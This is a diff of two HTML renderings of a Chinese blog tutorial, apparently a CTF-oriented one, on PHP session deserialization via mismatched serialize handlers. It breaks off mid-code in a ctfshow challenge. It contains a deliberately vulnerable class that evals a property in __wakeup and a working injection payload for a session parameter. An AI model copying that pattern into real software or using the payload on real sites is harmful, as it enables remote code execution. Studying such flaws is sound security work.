-			<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>这几天好多奇怪的事情，让我不得不放下一些东西，哎哟，把这个<code>session</code>反序列化拿下就去看<code>GC</code>回收机制</p>
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">baozongwi</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-09-11T08:15:57.000Z" class="dt-published" itemprop="datePublished">2024-09-11</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/talk/">talk</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/session/" rel="tag">session</a>, <a class="p-category" href="/tags/%E5%A7%BF%E5%8A%BF/" rel="tag">姿势</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>这几天好多奇怪的事情，让我不得不放下一些东西，哎哟，把这个<code>session</code>反序列化拿下就去看<code>GC</code>回收机制</p>
 <h1 id="0x02-question"><a href="#0x02-question" class="headerlink" title="0x02 question"></a>0x02 question</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="session-本身机制"><a href="#session-本身机制" class="headerlink" title="session 本身机制"></a>session 本身机制</h3><blockquote>
 <p><code>session</code>（会话）是服务器端用于在用户访问网站时保存信息的一种机制。它允许在多个页面请求之间共享和持久化数据，以便追踪用户的状态或存储临时信息。</p>
 </blockquote>
 <p>那么从这里也可以看出来有时候我们写脚本明明可以直接利用<code>requests</code>,但是却要写成这样</p>
-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">sess=requests.session()</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">sess=requests.session()</span><br></pre></td></tr></table></figure>
 
 <h3 id="为啥要用session"><a href="#为啥要用session" class="headerlink" title="为啥要用session"></a>为啥要用session</h3><p>大家都知道我们访问网站时，使用的协议是<strong>http(https)</strong>,但是HTTP 是一种<strong>无状态协议</strong>，也就是说，每次请求都是独立的，服务器不会记得上一次请求的信息。因此，<code>session</code> 被用来弥补这个缺点，帮助服务器跟踪用户状态。</p>
 <p>那么是通过什么来跟踪的呢?这里就是<strong>Session ID 生成与存储</strong></p>
@@ -555,592 +197,314 @@
 </ul>
 <h3 id="session的产生和储存"><a href="#session的产生和储存" class="headerlink" title="session的产生和储存"></a>session的产生和储存</h3><blockquote>
 <p><strong>session_start()</strong> 会创建新会话或者重用现有会话。 如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID， 则会重用现有会话。</p>
-<p>当会话自动开始或者通过 <strong>session_start()</strong> 手动开始的时候， PHP 内部会调用会话处理程序的 open 和 read 回调函数。 会话处理程序可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 <a class="link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.session-set-save-handler.php" >session_set_save_handler()<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 设定的用户自定义会话处理程序。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储）， PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量</p>
+<p>当会话自动开始或者通过 <strong>session_start()</strong> 手动开始的时候， PHP 内部会调用会话处理程序的 open 和 read 回调函数。 会话处理程序可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.session-set-save-handler.php">session_set_save_handler()</a> 设定的用户自定义会话处理程序。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储）， PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量</p>
 </blockquote>
 <p>这里直接给官方文档的描述了，那么细心看的师傅会发现这里有反序列化，也就是我们的利用点(等会说)</p>
 <p>那么我们写个Demo来看看是怎么存储的路径在哪里</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">session_id</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">&quot;PHPSESSID&quot;</span>];</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">session_id</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">&quot;PHPSESSID&quot;</span>];</span><br></pre></td></tr></table></figure>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-111641.png"
-                      alt="1"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-111713.png"
-                      alt="2"
-                ></p>
+<p><img src="/../images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-111641.png" alt="1"></p>
+<p><img src="/../images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-111713.png" alt="2"></p>
 <p>可以看到是保存在临时文件目录里面</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php5/sess_PHPSESSID</span><br><span class="line">/var/lib/php7/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSED</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php5/sess_PHPSESSID</span><br><span class="line">/var/lib/php7/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSED</span><br></pre></td></tr></table></figure>
 
 <p>这些是常见的保存位置</p>
 <p>我把cookie进行修改之后也是进行了部分的变化</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-112606.png"
-                      alt="3"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-112611.png"
-                      alt="4"
-                ></p>
+<p><img src="/../images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-112606.png" alt="3"></p>
+<p><img src="/../images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-112611.png" alt="4"></p>
 <p>那么我们再来看看<code>php.ini</code>中对<code>session</code>的配置</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">session.save_path = <span class="string">&quot;/tmp&quot;</span></span><br><span class="line"><span class="comment">#session保存到/tmp目录</span></span><br><span class="line">session.save_handler = files</span><br><span class="line"><span class="comment">#session的存储方式。这里是存储为文件</span></span><br><span class="line">session.serialize_handler = php</span><br><span class="line"><span class="comment">#session默认的序列化引擎是php</span></span><br><span class="line">session.auto_start = <span class="number">0</span></span><br><span class="line"><span class="comment">#session是否默认打开。即是否默认开启session_start()</span></span><br><span class="line">sess_sessionid</span><br><span class="line"><span class="comment">#session默认是以sess_随机字符串命名</span></span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">session.save_path = <span class="string">&quot;/tmp&quot;</span></span><br><span class="line"><span class="comment">#session保存到/tmp目录</span></span><br><span class="line">session.save_handler = files</span><br><span class="line"><span class="comment">#session的存储方式。这里是存储为文件</span></span><br><span class="line">session.serialize_handler = php</span><br><span class="line"><span class="comment">#session默认的序列化引擎是php</span></span><br><span class="line">session.auto_start = <span class="number">0</span></span><br><span class="line"><span class="comment">#session是否默认打开。即是否默认开启session_start()</span></span><br><span class="line">sess_sessionid</span><br><span class="line"><span class="comment">#session默认是以sess_随机字符串命名</span></span><br></pre></td></tr></table></figure>
 
 <p>其中也提到了重要知识session的序列化引擎，其实是有三个引擎</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line"></span><br><span class="line">php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</span><br><span class="line"></span><br><span class="line">php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line"></span><br><span class="line">php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</span><br><span class="line"></span><br><span class="line">php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</span><br></pre></td></tr></table></figure>
 
 <p>写个Demo具体看看</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">// ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_binary&#x27;);</span></span><br><span class="line"><span class="comment">// ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;bao&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">// ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_binary&#x27;);</span></span><br><span class="line"><span class="comment">// ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;bao&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure>
 
 <p>得到</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php:  bao|s:2:&quot;18&quot;;</span><br><span class="line"></span><br><span class="line">php_binary:       baos:2:&quot;18&quot;;</span><br><span class="line"></span><br><span class="line">php_serialize(php&gt;5.5.4):        a:1:&#123;s:3:&quot;bao&quot;;s:2:&quot;18&quot;;&#125;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php:  bao|s:2:&quot;18&quot;;</span><br><span class="line"></span><br><span class="line">php_binary:       baos:2:&quot;18&quot;;</span><br><span class="line"></span><br><span class="line">php_serialize(php&gt;5.5.4):        a:1:&#123;s:3:&quot;bao&quot;;s:2:&quot;18&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h2><p>刚才我们看了<code>session_start()</code>的官方文档，当会话开始时，session_start()即会话开始时。session就会通过指定的序列化引擎将<code>$_SESSION</code>序列化。然后放入文件进行存储。那么当我们再次开启对话的时候他也会进行自动的反序列化来填充<code>$_SESSION</code></p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>()</span><br><span class="line"><span class="comment">#session_start()-&gt;读取session文件内容-&gt;反序列化</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]=<span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="comment">#serialize($_SESSION)-&gt;存入文件</span></span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>()</span><br><span class="line"><span class="comment">#session_start()-&gt;读取session文件内容-&gt;反序列化</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]=<span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="comment">#serialize($_SESSION)-&gt;存入文件</span></span><br></pre></td></tr></table></figure>
 
 <p>那么如果此时开发者使用的引擎与默认引擎不同，是不是就会产生歧义，此时我们利用数据的存储形式不同的漏洞是不是就可以任意触发魔术方法进行利用了</p>
 <p>也就是说，<strong>Session反序列化都是序列化引擎不一致导致存在安全问题</strong></p>
 <h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo 1"></a>Demo 1</h3><p><strong>1.php</strong></p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p><strong>2.php</strong></p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;test&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;test&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>刚才提到了漏洞的出现就是因为引擎的不同，所以这里写了两个文件，一个是使用的<code>php_serialize</code>另一个是<code>php</code></p>
 <p>序列化界面是<code>php</code>，就代表着等会进行反序列化是<code>|</code>后面会认为是序列化数据</p>
 <p>传参解密是<code>php_serialize</code>,代表着进行序列化是<code>json</code>格式保存</p>
 <p>那么写个简单的<code>poc</code></p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">O:4:&quot;Test&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span></span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">O:4:&quot;Test&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
 
 <p>传参为</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/2.php?test=|O:4:&quot;Test&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/2.php?test=|O:4:&quot;Test&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>此时<code>sess_baozongwi</code>文件内容为</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;test&quot;;s:45:&quot;|O:4:&quot;Test&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;test&quot;;s:45:&quot;|O:4:&quot;Test&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>那么<code>php</code>引擎反序列化时会将<code>a:1:&#123;s:4:&quot;test&quot;;s:45:&quot;</code>认为是键名，此时访问<code>/1.php</code></p>
 <p>发现成功反序列化</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-130314.png"
-                      alt="4"
-                ></p>
+<p><img src="/../images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-130314.png" alt="4"></p>
 <h3 id="Demo-2"><a href="#Demo-2" class="headerlink" title="Demo 2"></a>Demo 2</h3><p><strong>ctfshow web263</strong></p>
 <p>一个简单的审计<code>session</code></p>
 <p><code>index.php</code></p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">	<span class="comment">//超过5次禁止登陆</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line">		<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;limit&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line">		 <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">	<span class="comment">//超过5次禁止登陆</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line">		<span class="variable">$_COOKIE</span>[<span 